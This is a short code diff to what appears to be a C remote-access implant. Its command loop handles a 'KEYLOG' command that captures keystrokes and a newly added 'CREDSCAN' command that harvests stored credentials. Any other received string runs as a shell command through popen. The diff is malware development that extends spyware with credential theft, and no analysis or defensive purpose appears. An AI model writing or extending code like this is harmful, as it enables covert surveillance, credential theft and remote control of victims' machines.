@@ -6,6 +6,7 @@
 #include <unistd.h>
 #include <stdlib.h>
 #include "../include/keylog.h"
+#include "../include/credscan.h"
 
 int main()
 {
@@ -47,8 +48,11 @@ int main()
 
         memset(output, 0, sizeof(output));
         if (strncmp(buf, "KEYLOG", 6) == 0) {
-        char *keys = start_keylog(10);
-        snprintf(output, sizeof(output), "%s", keys ? keys : "[keylog failed]");
+            char *keys = start_keylog(10);
+            snprintf(output, sizeof(output), "%s", keys ? keys : "[keylog failed]");
+        } else if (strncmp(buf, "CREDSCAN", 8) == 0) {
+            char *creds = scan_credentials();
+            snprintf(output, sizeof(output), "%s", creds ? creds : "[credscan failed]");
         } else {
             FILE *fp = popen(buf, "r");
             if (fp == NULL) {
